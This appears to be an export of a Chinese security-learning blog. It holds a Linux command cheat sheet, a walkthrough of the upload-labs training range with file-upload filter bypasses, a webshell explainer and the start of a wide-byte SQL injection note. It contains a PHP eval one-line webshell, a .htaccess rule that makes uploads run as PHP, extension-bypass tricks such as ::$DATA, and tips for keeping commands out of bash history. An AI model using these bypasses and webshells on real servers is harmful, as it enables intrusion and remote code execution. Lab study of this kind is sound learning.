-o size=512m</code></pre><p><strong>Grep whole words:</strong></p><pre><code class="text">grep -w &quot;name&quot; test.txt</code></pre><p><strong>在需要提升权限的情况下往一个文件里追加文本：</strong></p><pre><code class="text">echo &quot;some text&quot; | sudo tee -a /path/file</code></pre><p><strong>列出所有kill signal参数:</strong></p><pre><code class="text">kill -l</code></pre><p><strong>在bash历史记录里禁止记录最后一次会话：</strong></p><pre><code class="text">kill -9 $$</code></pre><p><strong>扫描网络寻找开放的端口：</strong></p><pre><code class="text">nmap -p 8081 172.20.0.0/16</code></pre><p><strong>设置git email:</strong></p><pre><code class="text">git config --globaluser.email &quot;me@example.com&quot; </code></pre><p><strong>To sync with master if you have unpublished commits:</strong></p><pre><code class="text">git pull --rebase origin master</code></pre><p><strong>将所有文件名中含有”txt”的文件移入/home/user目录:</strong></p><pre><code class="text">find -iname &quot;*txt*&quot; -exec mv -v &#123;&#125; /home/user \;</code></pre><p><strong>将文件按行并列显示：</strong></p><pre><code class="text">paste test.txt test1.txt</code></pre><p><strong>shell里的进度条:</strong></p><pre><code class="text">pv data.log</code></pre><p><strong>使用netcat将数据发送到Graphite server:</strong></p><pre><code class="text">echo &quot;hosts.sampleHost 10 `date +%s`&quot; | nc 192.168.200.2 3000</code></pre><p><strong>将tabs转换成空格：</strong></p><pre><code class="text">expand test.txt &gt; test1.txt</code></pre><p><strong>Skip bash history:</strong></p><pre><code class="text">&lt; space &gt;cmd</code></pre><p><strong>去之前的工作目录：</strong></p><pre><code class="text">cd -</code></pre><p><strong>拆分大体积的tar.gz文件(每个100MB)，然后合并回去：</strong></p><pre><code class="text">split –b 100m /path/to/large/archive /path/to/output/files cat files* &gt; archive</code></pre><p><strong>使用curl获取HTTP status code:</strong></p><pre><code class="text">curl -sL -w &quot;%&#123;http_code&#125;\\n&quot; www.example.com -o /dev/null</code></pre><p><strong>设置root密码，强化MySQL安全安装:</strong></p><pre><code class="text">/usr/bin/mysql_secure_installation</code></pre><p><strong>当Ctrl + c不好使时:</strong></p><pre><code class="text">Ctrl + \</code></pre><p><strong>获取文件owner:</strong></p><pre><code class="text">stat -c %U file.txt</code></pre><p><strong>block设备列表：</strong></p><pre><code class="text">lsblk -f</code></pre><p><strong>找出文件名结尾有空格的文件：</strong></p><pre><code class="text">find . -type f -exec egrep -l &quot; +$&quot; &#123;&#125; \;</code></pre><p><strong>找出文件名有tab缩进符的文件</strong></p><pre><code class="text">find . -type f -exec egrep -l $&#39;\t&#39; &#123;&#125; \;</code></pre><p><strong>用”=”打印出横线:全选复制放进笔记</strong></p><pre><code class="text">printf &#39;%100s\n&#39; | tr &#39; &#39; =</code></pre>]]></content>
      
      
      <categories>
          
          <category> 命令学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs靶场</title>
      <link href="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/"/>
      <url>/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230602092842788.png" alt="image-20230602092842788"></p><h2 id="pass-01-js验证"><a href="#pass-01-js验证" class="headerlink" title="pass-01(js验证)"></a>pass-01(js验证)</h2><p>上传木马后</p><p>提示：该文件不允许上传，请上传.jpg|.png|.gif类型的文件,当前文件类型为：.php</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230523232014129.png" alt="image-20230523232014129"></p><h4 id="分析一下代码"><a href="#分析一下代码" class="headerlink" title="分析一下代码"></a>分析一下代码</h4><p>这里我们跳过弹窗的提示，可以看出来这个验证是前端进行的，</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230523232753987.png" alt="image-20230523232753987"></p><p>从标记的代码中可以看出，使用了onsubmit这个函数，触发了文件提交事件，在表单提交后马上调用了return checkFile 这个函数对上传进行了检查。</p><h4 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h4><h5 id="第一种：创建一个新的html文件，将页面的源代码复制下来，进行修改删除操作禁用掉里面的js脚本。"><a href="#第一种：创建一个新的html文件，将页面的源代码复制下来，进行修改删除操作禁用掉里面的js脚本。" class="headerlink" title="第一种：创建一个新的html文件，将页面的源代码复制下来，进行修改删除操作禁用掉里面的js脚本。"></a>第一种：创建一个新的html文件，将页面的源代码复制下来，进行修改删除操作禁用掉里面的js脚本。</h5><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230523234905931.png" alt="image-20230523234905931"></p><p>把onsubmit这个函数删掉，</p><p>把script代码也删掉</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230523235125426.png" alt="image-20230523235125426"></p><p> 在form表单中添加第一关的提交地址</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230523235402326.png" alt="image-20230523235402326"></p><h5 id="第二种：直接按F12-把onsubmit这个直接删除掉"><a href="#第二种：直接按F12-把onsubmit这个直接删除掉" class="headerlink" title="第二种：直接按F12 把onsubmit这个直接删除掉"></a>第二种：直接按F12 把onsubmit这个直接删除掉</h5><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230523235950881.png" alt="image-20230523235950881"></p><p>不推荐第二种，因为如果是在浏览器查看器中直接删除的话，可能他还有一些正常的js，</p><p>如果把正常的js给删除掉的话，可能正常的js会影响到上传操作。</p><h2 id="pass-02-后端验证-文件类型校验-MIME校验"><a href="#pass-02-后端验证-文件类型校验-MIME校验" class="headerlink" title="pass-02(后端验证) 文件类型校验 (MIME校验)"></a>pass-02(后端验证) 文件类型校验 (MIME校验)</h2><p>上传木马后</p><p>提示：本pass在服务端对数据包的MIME进行检查。</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230528133234181.png" alt="image-20230528133234181"></p><p>分析代码：</p><p>从源码中可以看出只对文件类型(type) 进行验证，必须是image/jpeg或者image/png 或者image/gif的格式，没有对后缀名进行验证，</p><p>只需要bp抓包将Content-Type:的参数修改成image/jpeg 或者image/png 或者image/gif其中的一种，进行绕过就好。</p><p>操作步骤：</p><p>开始bp抓包，修改content-type类型即可</p><h3 id="理解一下什么是MIME？"><a href="#理解一下什么是MIME？" class="headerlink" title="理解一下什么是MIME？"></a>理解一下什么是MIME？</h3><h6 id="MIME-多用途互联网邮件扩展协议。用途为根据文件后缀名判断文件类型，用什么应用程序打开，但是在这里是根据文件类型判断后缀名。"><a href="#MIME-多用途互联网邮件扩展协议。用途为根据文件后缀名判断文件类型，用什么应用程序打开，但是在这里是根据文件类型判断后缀名。" class="headerlink" title="MIME:多用途互联网邮件扩展协议。用途为根据文件后缀名判断文件类型，用什么应用程序打开，但是在这里是根据文件类型判断后缀名。"></a>MIME:多用途互联网邮件扩展协议。用途为根据文件后缀名判断文件类型，用什么应用程序打开，但是在这里是根据文件类型判断后缀名。</h6><p>$_FILES[‘myfile’][‘type’]文件的MIME类型，需要浏览器提供该信息的支持，例如”image/gif”</p><p>MIME 给出的是文件的MIME信息 ，此信息可以用来在HTTP Conten-type 头 信息中发送 正确的信息，如：header(“Cotent-type:image/gif”)</p><pre><code>文件格式编辑播报最早的HTTP协议中，并没有附加的数据类型信息，所有传送的数据都被客户程序解释为超文本标记语言HTML 文档，而为了支持多媒体数据类型，HTTP协议中就使用了附加在文档之前的MIME数据类型信息来标识数据类型。MIME意为多功能Internet邮件扩展，它设计的最初目的是为了在发送电子邮件时附加多媒体数据，让邮件客户程序能根据其类型进行处理。然而当它被HTTP协议支持之后，它的意义就更为显著了。它使得HTTP传输的不仅是普通的文本，而变得丰富多彩。每个MIME类型由两部分组成，前面是数据的大类别，例如声音audio、图象image等，后面定义具体的种类。七种大类别：videoimageapplicationtextaudiomultipartmessage常见的MIME类型(通用型)：超文本标记语言文本 .html text/htmlxml文档 .xml text/xmlXHTML文档 .xhtml application/xhtml+xml普通文本 .txt text/plainRTF文本 .rtf application/rtfPDF文档 .pdf application/pdfMicrosoft Word文件 .word application/mswordPNG图像 .png image/pngGIF图形 .gif image/gifJPEG图形 .jpeg,.jpg image/jpegau声音文件 .au audio/basicMIDI音乐文件 mid,.midi audio/midi,audio/x-midiRealAudio音乐文件 .ra, .ram audio/x-pn-realaudioMPEG文件 .mpg,.mpeg video/mpegAVI文件 .avi video/x-msvideoGZIP文件 .gz application/x-gzipTAR文件 .tar application/x-tar任意的二进制数据 application/octet-stream</code></pre><h5 id="涉及的函数用法"><a href="#涉及的函数用法" class="headerlink" title="涉及的函数用法"></a>涉及的函数用法</h5><pre><code>trim():去除左右两侧的空白deldot（）：删除末尾的店strrchar(string,char):函数查找串，在string字符串中查找，char在string字符串中最后一次出现的位置，返回并从该位置截取到尾，如果没有找到字符，则返回falsestrrchar(&#39;hello  wordld,i love you &#39;,&#39;i&#39;)输出结果： i love you strtolower():函数 把所有字符串装换成小写str_ireplace(fine,replace,strin):替换，在strin字符串中，去搜索fine字符串，如果搜到到匹配上了，用replace字符串进行替换</code></pre><h2 id="pass-03-文件后缀名，黑名单绕过"><a href="#pass-03-文件后缀名，黑名单绕过" class="headerlink" title="pass-03(文件后缀名，黑名单绕过)"></a>pass-03(文件后缀名，黑名单绕过)</h2><p>上传木马后</p><p>提示：不允许上传.asp,.aspx,.php,.jsp后缀文件！            </p><p>查看原代码</p><pre><code>&lt;?phpinclude &#39;../config.php&#39;;include &#39;../common.php&#39;;include &#39;../head.php&#39;;include &#39;../menu.php&#39;;$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;);        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#39;.&#39;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //收尾去空        if(!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;                        if (move_uploaded_file($temp_file,$img_path)) &#123;                 $is_upload = true;            &#125; else &#123;                $msg = &#39;上传出错！&#39;;            &#125;        &#125; else &#123;            $msg = &#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#39;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;    &#125;&#125;?&gt;</code></pre><h4 id="分析一下代码："><a href="#分析一下代码：" class="headerlink" title="分析一下代码："></a>分析一下代码：</h4><p>这里使用了数组的方式，设置了黑名单，不允许.asp  .aspx  .php  .jsp 的后缀名文件进行上传。</p><h4 id="绕过思路："><a href="#绕过思路：" class="headerlink" title="绕过思路："></a>绕过思路：</h4><p>php开发了这么久了，不止只有这一个文件名，我们可以使用其他的php的别名进行绕</p><p>过：.php3 .php4 .php5 .phtml .phtm .phps .phpt .php345 （但是这里是有前提条件的）就是对方的</p><p>服务器的配置有对这些php其他的文件名配置了解析的设置，否认就算你上传上去了，还是解析失败。</p><p>配置好了对应的解析，直接修改文件名就好了把1.php修改成你配置的对应的解析的文件名。</p><h4 id="实现方法："><a href="#实现方法：" class="headerlink" title="实现方法："></a>实现方法：</h4><p>test.php修改后test.phtml    上传成功！</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230523230745151.png" alt="image-20230523230745151"></p><p>蚁剑连接</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230523231053874.png" alt="image-20230523231053874"></p><h2 id="pass-04-文件名后缀验证，配置文件解析控制"><a href="#pass-04-文件名后缀验证，配置文件解析控制" class="headerlink" title="pass-04(文件名后缀验证，配置文件解析控制)"></a>pass-04(文件名后缀验证，配置文件解析控制)</h2><p>上传木马后</p><p>提示：此文件不允许上传!     </p><p>查看一下源代码</p><p>黑名单里面禁止上传这些后缀的文件</p><pre><code class="php">.php,.php5,.php4,.php3,.php2,.php1,.html,.htm,.phtml,.pht,.pHp,.pHp5,.pHp4,.pHp3,.pHp2,.pHp1,.Html,.Htm,.pHtml,.jsp,.jspa,.jspx,.jsw,.jsv,.jspf,.jtml,.jSp,.jSpx,.jSpa,.jSw,.jSv,.jSpf,.jHtml,.asp,.aspx,.asa,.asax,.ascx,.ashx,.asmx,.cer,.aSp,.aSpx,.aSa,.aSax,.aScx,.aShx,.aSmx,.cEr,.sWf,.swf,.ini</code></pre><p>  <img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230524203551062.png" alt="image-20230524203551062">     </p><p>从源代码中可以看出，还是使用了一个黑名单的限制，对文件的后缀名进行了验证，并且限制的后缀名比之前的更多。但是我们可以从黑名单中看出没有对.htaccess文件进行验证，那么我们就可以使用.htaccess进行绕过。</p><h5 id="htaccess功能介绍：htaccess文件是Apache服务器中的一个配置文件。这个文件可以不用获得root权限，就可以更改这个目录下的所有的文件配置。那么说明只要创建一个-htaccess所在目录的所有文件配置就会都修改转换成PHP的解析格式。-htaccess文件只对Apache服务器有效-。"><a href="#htaccess功能介绍：htaccess文件是Apache服务器中的一个配置文件。这个文件可以不用获得root权限，就可以更改这个目录下的所有的文件配置。那么说明只要创建一个-htaccess所在目录的所有文件配置就会都修改转换成PHP的解析格式。-htaccess文件只对Apache服务器有效-。" class="headerlink" title=".htaccess功能介绍：htaccess文件是Apache服务器中的一个配置文件。这个文件可以不用获得root权限，就可以更改这个目录下的所有的文件配置。那么说明只要创建一个 .htaccess所在目录的所有文件配置就会都修改转换成PHP的解析格式。(.htaccess文件只对Apache服务器有效)。"></a>.htaccess功能介绍：htaccess文件是Apache服务器中的一个配置文件。这个文件可以不用获得root权限，就可以更改这个目录下的所有的文件配置。那么说明只要创建一个 .htaccess所在目录的所有文件配置就会都修改转换成PHP的解析格式。(.htaccess文件只对Apache服务器有效)。</h5><p>操作步骤：</p><p>1.首先先创建一个 .htaccess 的文件在文件中写入</p><pre><code>SetHandler application/x-httpd-php</code></pre><p>2.把这个文件上传到服务器上。</p><p>3.将一句话木马文件名修改成gif/png/jpe其中格式的一种。比如2.png</p><p> 上传成功。</p><p>4.将p.git(一句话木马的文件)上传到服务器</p><p>这里的关键点就是.htaccess这个文件，把所有的目录下的文件的解析方式都修改成了php，</p><p>所以我们第二次上传的图片2.png “png”不在黑名单中，但是由于.htaccess文件所以又把他解析成了php的格式，所以可以完成正常的解析。</p><h2 id="pass-05-文件名后缀验证-点-空格-点"><a href="#pass-05-文件名后缀验证-点-空格-点" class="headerlink" title="pass-05(文件名后缀验证 ,点+空格+点)"></a>pass-05(文件名后缀验证 ,点+空格+点)</h2><p>查看源码</p><pre><code>$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#39;.&#39;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //首尾去空                if (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;            if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#39;上传出错！&#39;;            &#125;        &#125; else &#123;            $msg = &#39;此文件类型不允许上传！&#39;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;    &#125;&#125;</code></pre><pre><code>定义两个变量：is_upload代表文件是否上传成功，msg代表错误信息提示。if...sumit检测是否有表单提交数据通过检测$_POST数组中是否存在’submit’键名。if(file_exits (UPLOAD_PATH))&#123;如果指定的文件夹存在通过检测目录是否存在(即在服务器上是否有上传文件夹)$deny_ext黑名单,定义了一个包含不允许上传的文件类型的$deny_ext数组$file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);$file_name = deldot($file_name);//删除文件名末尾的点获取上传文件名并删除文件名末尾的点$file_ext = strrchr($file_name, &#39;.&#39;);$file_ext = strtolower($file_ext); //转换为小写$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA$file_ext = trim($file_ext); //首尾去空从上传文件名中提取文件扩展名并运行一些大小写转换和字符串替换处理。if (!in_array($file_ext, $deny_ext)) &#123;如果文件类型是可接受的，则执行下一步操作。、$temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];$img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;获取上传文件在服务器临时目录中的路径和在指定目录中显示的路径。if (move_uploaded_file($temp_file, $img_path)) &#123;    $is_upload = true;&#125; else &#123;    $msg = &#39;上传出错！&#39;;&#125;将上传文件从服务器临时目录移动到指定目录，并确定是否上传成功，$msg则保存了任何错误信息。&#125; else &#123;    $msg = &#39;此文件类型不允许上传！&#39;;&#125;如果文件类型不是可接受的，则发送错误提示消息。&#125; else &#123;    $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;&#125;如果指定的上传文件夹不存在，则向用户返回一条错误消息。</code></pre><p>bp抓包看看</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610231428383.png" alt="image-20230610231428383"></p><p>用蚁剑连接</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610231151446.png" alt="image-20230610231151446"></p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610231315662.png" alt="image-20230610231315662"></p><h2 id="Pass-06-文件名后缀验证，大小写绕过"><a href="#Pass-06-文件名后缀验证，大小写绕过" class="headerlink" title="Pass-06 (文件名后缀验证，大小写绕过)"></a>Pass-06 (文件名后缀验证，大小写绕过)</h2><p>查看提示，黑名单禁止上传</p><pre><code>.php,.php5,.php4,.php3,.php2,.html,.htm,.phtml,.pht,.pHp,.pHp5,.pHp4,.pHp3,.pHp2,.Html,.Htm,.pHtml,.jsp,.jspa,.jspx,.jsw,.jsv,.jspf,.jtml,.jSp,.jSpx,.jSpa,.jSw,.jSv,.jSpf,.jHtml,.asp,.aspx,.asa,.asax,.ascx,.ashx,.asmx,.cer,.aSp,.aSpx,.aSa,.aSax,.aScx,.aShx,.aSmx,.cEr,.sWf,.swf,.htaccess,.ini</code></pre><p>查看源代码</p><p><code>$file_ext = strtolower($file_ext); //转换为小写</code></p><p>源码中没有转换成小写，所以我们可以用大小写绕过</p><h2 id="Pass-07-文件名后缀验证-空格绕过"><a href="#Pass-07-文件名后缀验证-空格绕过" class="headerlink" title="Pass-07 (文件名后缀验证,空格绕过)"></a>Pass-07 (文件名后缀验证,空格绕过)</h2><p><code>$file_name= trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); //代码中无收尾去空函数trim() //去除字符串中的空格</code></p><p>方法：<code>后缀加空格</code></p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610175638767.png" alt="image-20230610175638767"></p><p>然后用蚁剑连接</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610175730423.png" alt="image-20230610175730423"></p><h2 id="pass-08-文件名后缀验证-点绕过"><a href="#pass-08-文件名后缀验证-点绕过" class="headerlink" title="pass-08(文件名后缀验证,点绕过)"></a>pass-08(文件名后缀验证,点绕过)</h2><p>代码中无deldot()函数 //删除文件名末尾的点</p><p>   <code>$file_name = deldot($file_name);//删除文件名末尾的点</code></p><p>方法：<code>在后缀 . </code></p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610223429650.png" alt="image-20230610223429650"></p><p>用蚁剑连接</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610223253561.png" alt="image-20230610223253561"></p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610223326733.png" alt="image-20230610223326733"></p><h2 id="pass-09-文件名后缀验证-DATA绕过"><a href="#pass-09-文件名后缀验证-DATA绕过" class="headerlink" title="pass-09(文件名后缀验证,::$DATA绕过)"></a>pass-09(文件名后缀验证,::$DATA绕过)</h2><p>源码中</p><p><code>$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA</code></p><p>少了str_ireplace(‘::$DATA’, ‘’, $file_ext);//去除字符串::$DATA</p><h3 id="利用Windows特性"><a href="#利用Windows特性" class="headerlink" title="利用Windows特性"></a>利用Windows特性</h3><h4 id="在window的时候如果文件名-”-DATA”会把-DATA之后的数据当成文件流处理-不会检测后缀名，且保持-DATA之前的文件名，他的目的就是不检查后缀名"><a href="#在window的时候如果文件名-”-DATA”会把-DATA之后的数据当成文件流处理-不会检测后缀名，且保持-DATA之前的文件名，他的目的就是不检查后缀名" class="headerlink" title="在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名，他的目的就是不检查后缀名"></a><strong>在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名，他的目的就是不检查后缀名</strong></h4><p>科普一下</p><p>什么是::$DATA呢？</p><p>::$DATA这是一种windows操作系统处理文件时的特性，为<code>文件流</code>，如果文件名后有此标记::$DATA</p><p>,并且没有做过滤，windows会不检查，直接保存该文件。使用他的目的就是不检查后缀名。</p><p>所以我们只要在文件名后面加上::$DATA就可以成功绕过</p><h3 id="方法：后缀加上-DATA"><a href="#方法：后缀加上-DATA" class="headerlink" title="方法：后缀加上::$DATA"></a>方法：<strong>后缀加上::$DATA</strong></h3><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610224605256.png" alt="image-20230610224605256"></p><p>用蚁剑连接</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610224421981.png" alt="image-20230610224421981"></p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610224445287.png" alt="image-20230610224445287"></p><h2 id="pass-10-文件名后缀验证-点-空格-点"><a href="#pass-10-文件名后缀验证-点-空格-点" class="headerlink" title="pass-10(文件名后缀验证,点+空格+点)"></a>pass-10(文件名后缀验证,点+空格+点)</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/2023/05/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2023/05/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="websell"><a href="#websell" class="headerlink" title="websell"></a>websell</h2><h3 id="什么叫做webshell？"><a href="#什么叫做webshell？" class="headerlink" title="什么叫做webshell？"></a>什么叫做webshell？</h3><p>1.webshell,简称为网页后门。简单来说它是运行在web应用之上的远程控制程序。</p><p>2.webshell是一张网页，由PHP，JSP,ASP,NET等这类web应用开发程序语言开发，但webshell并不具备常见网页的功能，例如登录、注册、信息展示等功能，一般会具备文件管理、端口扫描、提权、获取系统信息等功能。</p><h3 id="常见的webshell有哪些？"><a href="#常见的webshell有哪些？" class="headerlink" title="常见的webshell有哪些？"></a>常见的webshell有哪些？</h3><p>1.大马、小马、一句话木马、菜刀马、脱库马、各种马…等</p><p>2，拥有较完整功能的webshell，我们一般称为大马</p><p>3.功能相对简单的webshell成为小马</p><h3 id="webshell有什么作用？"><a href="#webshell有什么作用？" class="headerlink" title="webshell有什么作用？"></a>webshell有什么作用？</h3><h3 id="怎样能获取getshell？"><a href="#怎样能获取getshell？" class="headerlink" title="怎样能获取getshell？"></a>怎样能获取getshell？</h3><h3 id="webshell之php一句话木马解读"><a href="#webshell之php一句话木马解读" class="headerlink" title="webshell之php一句话木马解读"></a>webshell之php一句话木马解读</h3><pre><code>&lt;?php @eval($_post[x]);?&gt;</code></pre><p>$_post[x]:获取post请求参数中x的值。例如post请求中传递x=phpinfo(); , 那么$_post[x]就等同于</p><p>phpinfo(); </p><p>eval()将字符串当做PHP代码运行。例如eval(’phpinfo();’) , 其中phpinfo();会被当做PHP代码去执行。</p><pre><code>&lt;?php @eval($_POST[X]);?&gt;    实际上的传递过程是这样的&lt;?php @eval(`phpinfo();`);?&gt;   实际的语句是这样的</code></pre><p>我们通过该webshell，传递任意php代码，</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>宽字节注入</title>
      <link href="/2023/05/17/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/05/17/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="宽字节注入原理"><a href="#宽字节注入原理" class="headerlink" title="宽字节注入原理"></a>宽字节注入原理</h2><p>宽字节就是两个以上的字节，宽字节注入产生的原因就是各种字符编码的不当操作，使得攻击者可以通过宽字节编码绕过sql注入防御。</p><h3 id="常见的字符集"><a href="#常见的字符集" class="headerlink" title="常见的字符集"></a>常见的字符集</h3><p>ascii编码：单字节编码</p><p>0x00 null<br>0x20<br>0x21 !<br>0x22 “<br>0x23 #<br>0x24 $<br>0x25 %<br>0x26 &amp;<br>0x27 ’<br>0x28 (<br>0x29)<br>0x2A *<br>0x2B +<br>0x2C ,<br>0x2D -<br>0x2E .<br>0x2F /<br>0x3A :<br>0x3B ;<br>0x3C &lt;<br>0x3D =<br>0x3E &gt;<br>0x3F ?<br>0x40 @<br>0x5B [<br>0x5C<br>0x5D ]<br>0x5E ^<br>0x5F _<br>0x60 `<br>0x7B {<br>0x7C |<br>0x7D }<br>0x7E ~</p><p>latin1编码：单字节编码</p><p>gbk编码：使用一字节和双字节编码，0x00-0x7F范围内是一位，和ascii保持一致。双字节的第一个字节范围是0x81-0xFE</p><p>utf-8编码：使用一至四字节编码，0x00-0x7F范围内是一位，和ascii保持一致。其他字符用二至四个字节变长表示。</p><h3 id="MySQL字符转换"><a href="#MySQL字符转换" class="headerlink" title="MySQL字符转换"></a>MySQL字符转换</h3><p>数据提交到mysql数据库，需要进行字符集的转换，使得mysql数据库可以对数据进行处理，这个过程一般有以下三个步骤：</p><p>收到请求，将请求数据从character_set_client -&gt;character_set_connection.</p><p>内部操作，将数据从character_set_connection  –&gt;表创建的字符集。</p><p>结果输出，将数据从表创建的字符集 –&gt;character_set_results。</p><p>当执行set names ”charset”，相当于执行</p><p>set character_set_client = charset</p><p>set character_set_connection = charset</p><p>set character_set_results = charset</p><p>client 指的是php程序</p><p>connection指的是php客户端与mysql服务器之间连接层</p><p>results 指的是mysql服务器返回给PHP客户端的结果</p><h3 id="sqli-labs-less-32"><a href="#sqli-labs-less-32" class="headerlink" title="sqli-labs/less-32"></a>sqli-labs/less-32</h3><p>1.查看源码</p><pre><code>&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);function check_addslashes($string)&#123;    $string = preg_replace(&#39;/&#39;. preg_quote(&#39;\\&#39;) .&#39;/&#39;, &quot;\\\\\\&quot;, $string);          //escape any backslash    $string = preg_replace(&#39;/\&#39;/i&#39;, &#39;\\\&#39;&#39;, $string);                               //escape single quote with a backslash    $string = preg_replace(&#39;/\&quot;/&#39;, &quot;\\\&quot;&quot;, $string);                                //escape double quote with a backslash              return $string;&#125;// take the variables if(isset($_GET[&#39;id&#39;]))&#123;$id=check_addslashes($_GET[&#39;id&#39;]);//echo &quot;The filtered request is :&quot; .$id . &quot;&lt;br&gt;&quot;;//logging the connection parameters to a file for analysis.$fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);fclose($fp);// connectivity mysql_query(&quot;SET NAMES gbk&quot;);$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 